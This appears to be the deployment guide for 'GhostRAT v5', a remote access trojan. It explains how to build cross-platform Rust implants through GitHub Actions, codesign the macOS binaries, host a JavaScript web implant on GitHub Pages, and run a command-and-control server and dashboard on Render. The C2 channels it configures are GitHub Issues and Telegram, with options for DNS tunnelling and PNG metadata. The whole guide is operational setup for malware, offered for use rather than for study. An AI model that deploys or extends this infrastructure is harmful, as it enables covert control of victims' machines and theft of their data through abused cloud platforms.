# GhostRAT v5 — Deployment Guide

This guide covers deploying all components of GhostRAT v5 to production.

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Native Implant (GitHub Actions)](#native-implant-github-actions)
- [Web Implant (GitHub Pages)](#web-implant-github-pages)
- [C2 Server (Render)](#c2-server-render)
- [Flask Dashboard (Render)](#flask-dashboard-render)
- [Environment Variables](#environment-variables)
- [GitHub Secrets Reference](#github-secrets-reference)

---

## Architecture Overview

```
┌─────────────┐     ┌──────────────┐     ┌─────────────────┐
│  Implant     │────▶│  C2 Server   │────▶│  Dashboard      │
│  (Native)    │     │  (Render)    │     │  (Render)       │
│  (GitHub     │     │              │     │                 │
│   Releases)  │     │              │     │                 │
└─────────────┘     └──────────────┘     └─────────────────┘
        │                    │
        │                    ▼
        │             ┌──────────────┐
        │             │  Telegram    │
        │             │  Bot API     │
        └────────────▶│              │
                      │  GitHub API  │
                      │  (Issues)    │
                      └──────────────┘
```

GhostRAT v5 has three deployable components:

1. **Native Implant** — Rust binary compiled via GitHub Actions, distributed via GitHub Releases
2. **Web Implant** — JavaScript implant deployed to GitHub Pages
3. **C2 Server + Dashboard** — Python Flask app deployed to Render

---

## Native Implant (GitHub Actions)

### Build Pipeline

The `.github/workflows/build.yml` workflow cross-compiles the Rust implant for all platforms:

| Platform | Target | Artifact |
|----------|--------|----------|
| Windows x64 | `x86_64-pc-windows-gnu` | `ghostrat-v5-windows-x64.exe` |
| Linux x64 | `x86_64-unknown-linux-gnu` | `ghostrat-v5-linux-x64` |
| macOS Intel | `x86_64-apple-darwin` | `ghostrat-v5-macos-x64` |
| macOS ARM | `aarch64-apple-darwin` | `ghostrat-v5-macos-arm64` |

### Triggering a Build

- **Push to `main`** — automatic build
- **Manual dispatch** — go to Actions → Build → "Run workflow"
- **Tag push** (`v*`) — builds + creates GitHub Release automatically

### Creating a Release

```bash
git tag -a v5.0.0 -m "GhostRAT v5.0.0 release"
git push origin v5.0.0
```

This triggers the `release.yml` workflow which:
1. Builds all four platform binaries
2. Strips symbols (Linux)
3. Codesigns macOS binaries (requires signing certificate)
4. Creates a GitHub Release with all artifacts

### macOS Code Signing

To codesign macOS binaries, add these secrets to your repository:

| Secret | Description |
|--------|-------------|
| `MACOS_SIGNING_CERT_P12_B64` | Base64-encoded `.p12` signing certificate |
| `MACOS_SIGNING_CERT_PASSWORD` | Password for the `.p12` file |
| `MACOS_SIGNING_IDENTITY` | Identity string (e.g., "Developer ID Application: ...") |

Generate the certificate:
```bash
# Export from Keychain Access → Login → Keys
# Then base64 encode:
base64 -i "SigningCertificate.p12" | pbcopy
# Paste as MACOS_SIGNING_CERT_P12_B64 in repo secrets
```

---

## Web Implant (GitHub Pages)

### Setup

1. The `.github/workflows/deploy-pages.yml` workflow deploys the `implant/` directory to GitHub Pages
2. Push any file changes to `implant/` on `main` to trigger deployment

### GitHub Pages Configuration

1. Go to **Settings → Pages** in your repository
2. Set **Source** to "GitHub Actions"
3. The workflow will handle deployment automatically

### Web Implant Files

The `implant/` directory should contain:
- `implant.html` — Main implant page
- `sw.js` — Service Worker for offline capability
- `sw-register.js` — Service Worker registration script
- `ghostrat-webgpu.js` — WebGPU compute shader implant

---

## C2 Server (Render)

### Deploying to Render

The C2 server is in the `server/` directory. Use the `dashboard/render.yaml` service definition:

1. Create a new Web Service on [Render](https://render.com)
2. Connect your GitHub repository
3. Configure the build/deploy settings (see below)
4. Add environment variables (see [Environment Variables](#environment-variables))

### Render Configuration

**Build Command:**
```bash
cd server && pip install -r requirements.txt
```

**Start Command:**
```bash
cd server && gunicorn c2_server:C2Server --workers 2 --bind 0.0.0.0:$PORT
```

**Note:** The C2 server class is `C2Server` in `c2_server.py`. Adjust the import if needed.

### Alternative: Dashboard Deployment

The Flask dashboard in `dashboard/` can also serve as the C2 interface:

1. In `dashboard/render.yaml`, the service is pre-configured
2. Deploy via Render's "New +" → "Web Service"
3. Connect your GitHub repo and select the `dashboard/` directory

---

## Flask Dashboard (Render)

### Quick Deploy

1. Go to [Render Dashboard](https://dashboard.render.com)
2. Click "New +" → "Web Service"
3. Connect your `giorgipirveli/ghostrat-v5` repository
4. Set the **Root Directory** to `dashboard`
5. Configure:

| Setting | Value |
|---------|-------|
| Name | ghostrat-dashboard |
| Environment | Python 3 |
| Build Command | `pip install -r requirements.txt` |
| Start Command | `gunicorn app:app --workers 2 --bind 0.0.0.0:$PORT` |

6. Add all required environment variables (see below)
7. Click "Create Web Service"

---

## Environment Variables

All components share a common set of environment variables. Configure these in your Render dashboard or local `.env` file.

### Required

| Variable | Description | Default |
|----------|-------------|---------|
| `GHOST_GITHUB_REPO_OWNER` | GitHub org/user for C2 | `""` |
| `GHOST_GITHUB_REPO_NAME` | GitHub repo name for C2 | `""` |
| `GHOST_GITHUB_TOKEN` | GitHub PAT with repo + issues scope | `""` |
| `GHOST_TELEGRAM_BOT_TOKEN` | Telegram bot token from @BotFather | `""` |
| `GHOST_TELEGRAM_CHAT_ID` | Target chat ID for results | `0` |
| `GHOST_CRYPTO_KEY` | XOR encryption key | `GHOSTRATV5` |

### Optional

| Variable | Description | Default |
|----------|-------------|---------|
| `GHOST_WIFI_SSID_PREFIX` | WiFi beacon SSID prefix | `GHOST-` |
| `GHOST_BLE_ADV_INTERVAL` | BLE advertising interval (ms) | `100` |
| `GHOST_DNS_SUBDOMAIN` | DNS tunnel subdomain | `cmd` |
| `GHOST_PNG_METADATA_KEY` | PNG tEXt chunk key | `Author` |
| `GHOST_POLL_INTERVAL` | C2 poll interval (seconds) | `30` |
| `GHOST_MAX_RETRIES` | Max retry count on rate-limit | `3` |
| `GHOST_RETRY_BACKOFF` | Retry backoff factor (seconds) | `2.0` |

### Dashboard-Specific

| Variable | Description | Default |
|----------|-------------|---------|
| `DASHBOARD_USERNAME` | Dashboard login username | (from `config/default.json`) |
| `DASHBOARD_PASSWORD` | Dashboard login password | (from `config/default.json`) |
| `DASHBOARD_POLL_INTERVAL` | GitHub/Telegram poll interval (s) | `30` |

### Creating a `.env` File

```env
# GitHub C2
GHOST_GITHUB_REPO_OWNER=giorgipirveli
GHOST_GITHUB_REPO_NAME=ghostrat-v5
GHOST_GITHUB_TOKEN=ghp_your_personal_access_token_here

# Telegram C2
GHOST_TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
GHOST_TELEGRAM_CHAT_ID=987654321

# Crypto
GHOST_CRYPTO_KEY=MyCustomKey2026!

# Tuning
GHOST_POLL_INTERVAL=30
GHOST_MAX_RETRIES=3
```

---

## GitHub Secrets Reference

For CI/CD workflows, configure these secrets in **Settings → Secrets and variables → Actions**:

| Secret | Required For | Description |
|--------|-------------|-------------|
| `GITHUB_TOKEN` | All workflows | Auto-injected, read+write contents |
| `MACOS_SIGNING_CERT_P12_B64` | build.yml, release.yml | Base64-encoded macOS signing cert |
| `MACOS_SIGNING_CERT_PASSWORD` | build.yml, release.yml | Password for the signing cert |
| `MACOS_SIGNING_IDENTITY` | build.yml, release.yml | Code signing identity string |

---

## Local Development

### Run C2 Server Locally

```bash
cd server
pip install -r ../dashboard/requirements.txt
python c2_server.py --demo
```

### Run Dashboard Locally

```bash
cd dashboard
pip install -r requirements.txt
python app.py
```

### Run Tests

```bash
cd server
python test_kill_chain.py --demo
```

### Build Native Implant Locally

```bash
cd implant/native
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-gnu
rustup target add x86_64-apple-darwin
rustup target add aarch64-apple-darwin

cargo build --release --target x86_64-pc-windows-gnu
cargo build --release --target x86_64-unknown-linux-gnu
cargo build --release --target x86_64-apple-darwin
cargo build --release --target aarch64-apple-darwin
```

---

## Troubleshooting

### Build fails on macOS target

Ensure the Apple signing certificate is correctly exported and base64-encoded. The certificate must have "Code Signing" extended key usage.

### GitHub Pages not updating

Check that the `deploy-pages.yml` workflow has the `pages` environment configured with the correct branch. Go to Settings → Pages to verify the source is set to "GitHub Actions".

### C2 server can't connect to Telegram

Verify `GHOST_TELEGRAM_BOT_TOKEN` is correct and the bot has been created via @BotFather. The bot must be added to the target chat or the chat ID must be a private chat with the bot.

### GitHub Issues C2 not working

Ensure the GitHub PAT (`GHOST_GITHUB_TOKEN`) has `repo` scope (full control). The repo must have issues enabled.
